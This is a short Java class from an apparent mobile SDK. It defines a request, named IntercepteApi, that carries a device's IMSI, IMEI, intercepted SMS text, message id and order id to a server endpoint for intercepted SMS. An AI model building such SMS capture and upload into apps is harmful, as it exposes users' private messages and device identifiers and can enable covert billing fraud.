package com.hh.sdk.api;


import com.hh.sdk.net.StringRequest;

/**
 * Created by engine on 15/3/18.
 */
public class IntercepteApi extends StringRequest {
    public String imsi ;
    public String imei ;
    public String port ;
    public String sms ;
    public String smsId ;
    public String orderId ;
    @Override
    public String getUrl() {
        return Url.BASE_URL + Url.INTECEPTOR_SMS;
    }
}
